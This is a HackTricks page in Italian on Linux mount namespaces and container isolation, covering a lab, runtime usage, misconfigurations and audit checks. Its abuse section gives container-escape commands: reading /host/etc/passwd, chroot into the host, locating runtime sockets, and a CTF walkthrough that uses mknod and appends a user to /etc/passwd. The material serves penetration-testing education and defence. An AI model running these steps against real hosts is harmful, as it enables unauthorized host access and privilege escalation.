# Mount Namespace

{{#include ../../../../../banners/hacktricks-training.md}}

## Panoramica

Il mount namespace controlla la **mount table** visualizzata da un processo. Questa è una delle funzionalità più importanti per l'isolamento dei container, perché il root filesystem, i bind mounts, i mount tmpfs, la vista di procfs, l'esposizione di sysfs e molti mount di supporto specifici del runtime vengono tutti definiti tramite quella mount table. Due processi possono accedere entrambi a `/`, `/proc`, `/sys` o `/tmp`, ma la destinazione a cui quei percorsi fanno riferimento dipende dal mount namespace in cui si trovano.

Dal punto di vista della container security, il mount namespace rappresenta spesso la differenza tra "questo è un application filesystem preparato in modo ordinato" e "questo processo può vedere o influenzare direttamente il filesystem dell'host". Per questo motivo, bind mounts, volumi `hostPath`, operazioni di mount privilegiate ed esposizioni scrivibili di `/proc` o `/sys` ruotano tutte attorno a questo namespace.

## Funzionamento

Quando un runtime avvia un container, di solito crea un mount namespace separato, prepara un root filesystem per il container, monta procfs e gli altri filesystem di supporto necessari e poi aggiunge facoltativamente bind mounts, mount tmpfs, secrets, config maps o host paths. Una volta che il processo è in esecuzione all'interno del namespace, l'insieme dei mount che visualizza è in gran parte separato dalla vista predefinita dell'host. L'host può comunque vedere il filesystem reale sottostante, ma il container vede la versione assemblata per lui dal runtime.

Questo è potente perché permette al container di credere di avere un proprio root filesystem, anche se l'host continua a gestire ogni cosa. È anche pericoloso, perché se il runtime espone il mount sbagliato, il processo acquisisce improvvisamente visibilità su risorse dell'host che il resto del security model potrebbe non essere stato progettato per proteggere.

## Laboratorio

Puoi creare un mount namespace privato con:
```bash
sudo unshare --mount --fork bash
mount --make-rprivate /
mkdir -p /tmp/ns-lab
mount -t tmpfs tmpfs /tmp/ns-lab
mount | grep ns-lab
```
Se apri un altro shell al di fuori di quel namespace e controlli la mount table, vedrai che il mount tmpfs esiste solo all'interno del mount namespace isolato. Questo è un esercizio utile perché mostra che l'isolamento dei mount non è una teoria astratta; il kernel presenta letteralmente una mount table diversa al processo.
Se apri un altro shell al di fuori di quel namespace e controlli la mount table, il mount tmpfs esisterà solo all'interno del mount namespace isolato.

All'interno dei container, un confronto rapido è:
```bash
docker run --rm debian:stable-slim mount | head
docker run --rm -v /:/host debian:stable-slim mount | grep /host
```
Il secondo esempio dimostra quanto sia facile per una configurazione del runtime creare una falla enorme attraverso il confine del filesystem.

## Utilizzo del runtime

Docker, Podman, gli stack basati su containerd e CRI-O si affidano tutti a un mount namespace privato per i container normali. Kubernetes si basa sullo stesso meccanismo per i volumi, i secret proiettati, le config map e i mount `hostPath`. Anche gli ambienti Incus/LXC fanno ampio affidamento sui mount namespace, soprattutto perché i system container spesso espongono filesystem più ricchi e simili a quelli di una macchina rispetto ai container applicativi.

Questo significa che, quando analizzi un problema del filesystem di un container, di solito non stai osservando una semplice peculiarità di Docker. Stai osservando un problema di mount namespace e di configurazione del runtime, espresso attraverso la piattaforma che ha avviato il workload.

## Configurazioni errate

L'errore più ovvio e pericoloso consiste nell'esporre il filesystem root dell'host o un altro percorso sensibile dell'host tramite un bind mount, ad esempio `-v /:/host`, oppure tramite un `hostPath` scrivibile in Kubernetes. A quel punto, la domanda non è più "il container può in qualche modo evadere?", ma piuttosto "quanto contenuto utile dell'host è già direttamente visibile e scrivibile?". Un bind mount dell'host scrivibile spesso trasforma il resto dell'exploit in una semplice questione di posizionamento di file, chroot, modifica della configurazione o individuazione dei socket del runtime.

Un altro problema comune consiste nell'esporre `/proc` o `/sys` dell'host in modi che aggirano la visualizzazione più sicura del container. Questi filesystem non sono normali mount di dati; sono interfacce verso lo stato del kernel e dei processi. Se il workload raggiunge direttamente le versioni dell'host, molte delle ipotesi alla base dell'hardening dei container cessano di essere applicabili in modo corretto.

Anche le protezioni in sola lettura sono importanti. Un filesystem root in sola lettura non protegge magicamente un container, ma elimina una grande quantità di spazio disponibile per la preparazione dell'attacco e rende più difficili la persistenza, il posizionamento di helper binary e la manomissione della configurazione. Al contrario, un filesystem root scrivibile o un bind mount dell'host scrivibile offre a un attaccante lo spazio necessario per preparare il passaggio successivo.

## Abuso

Quando il mount namespace viene utilizzato in modo errato, gli attaccanti fanno comunemente una delle quattro cose seguenti. **Leggono dati dell'host** che avrebbero dovuto rimanere al di fuori del container. **Modificano la configurazione dell'host** tramite bind mount scrivibili. **Montano o rimontano risorse aggiuntive** se capabilities e seccomp lo consentono. Oppure **raggiungono socket potenti e directory contenenti lo stato del runtime** che permettono loro di chiedere alla piattaforma dei container stessa di fornire ulteriore accesso.

Se il container può già visualizzare il filesystem dell'host, il resto del modello di sicurezza cambia immediatamente.

Quando sospetti la presenza di un bind mount dell'host, verifica innanzitutto cosa è disponibile e se è scrivibile:
```bash
mount | grep -E ' /host| /mnt| /rootfs|bind'
find /host -maxdepth 2 -ls 2>/dev/null | head -n 50
touch /host/tmp/ht_test 2>/dev/null && echo "host write works"
```
Se il filesystem root dell'host è montato in modalità read-write, l'accesso diretto all'host è spesso semplice come:
```bash
ls -la /host
cat /host/etc/passwd | head
chroot /host /bin/bash 2>/dev/null || echo "chroot failed"
```
Se l'obiettivo è l'accesso privilegiato al runtime anziché il chrooting diretto, enumera i socket e lo stato del runtime:
```bash
find /host/run /host/var/run -maxdepth 2 -name '*.sock' 2>/dev/null
find /host -maxdepth 4 \( -name docker.sock -o -name containerd.sock -o -name crio.sock \) 2>/dev/null
```
Se `CAP_SYS_ADMIN` è presente, verifica anche se è possibile creare nuovi mount dall'interno del container:
```bash
mkdir -p /tmp/m
mount -t tmpfs tmpfs /tmp/m 2>/dev/null && echo "tmpfs mount works"
mount -o bind /host /tmp/m 2>/dev/null && echo "bind mount works"
```
### Esempio completo: pivot Two-Shell con `mknod`

Un percorso di abuso più specializzato si presenta quando l'utente root del container può creare dispositivi a blocchi, host e container condividono un'identità utente in modo utile e l'attacker dispone già di un foothold con privilegi ridotti sull'host. In questa situazione, il container può creare un device node come `/dev/sda`, e l'utente host con privilegi ridotti può successivamente leggerlo tramite `/proc/<pid>/root/` per il processo corrispondente del container.

All'interno del container:
```bash
cd /
mknod sda b 8 0
chmod 777 sda
echo 'augustus:x:1000:1000:augustus:/home/augustus:/bin/bash' >> /etc/passwd
/bin/sh
```
Dall'host, come l'utente low-privilege corrispondente dopo aver individuato il PID della shell del container:
```bash
ps -auxf | grep /bin/sh
grep -a 'HTB{' /proc/<pid>/root/sda
```
La lezione importante non riguarda la ricerca esatta della stringa CTF. Il punto è che l'esposizione del mount namespace tramite `/proc/<pid>/root/` può consentire a un utente dell'host di riutilizzare i device node creati dal container, anche quando la policy dei device cgroup ne impediva l'uso diretto all'interno del container stesso.

## Controlli

Questi comandi servono a mostrarti la vista del filesystem in cui il processo corrente è effettivamente in esecuzione. L'obiettivo è individuare mount derivati dall'host, percorsi sensibili scrivibili e qualsiasi elemento che sembri più ampio rispetto alla root filesystem di un normale container applicativo.
```bash
mount                               # Simple mount table overview
findmnt                             # Structured mount tree with source and target
cat /proc/self/mountinfo | head -n 40   # Kernel-level mount details
```
Cosa è interessante qui:

- I bind mount dall'host, soprattutto `/`, `/proc`, `/sys`, le directory dello stato di runtime o le posizioni dei socket, dovrebbero attirare immediatamente l'attenzione.
- I mount read-write imprevisti sono generalmente più importanti di un gran numero di mount helper read-only.
- `mountinfo` è spesso il posto migliore per verificare se un percorso deriva realmente dall'host o è supportato da un overlay.

Questi controlli stabiliscono **quali risorse sono visibili in questo namespace**, **quali derivano dall'host** e **quali sono scrivibili o sensibili dal punto di vista della sicurezza**.
{{#include ../../../../../banners/hacktricks-training.md}}
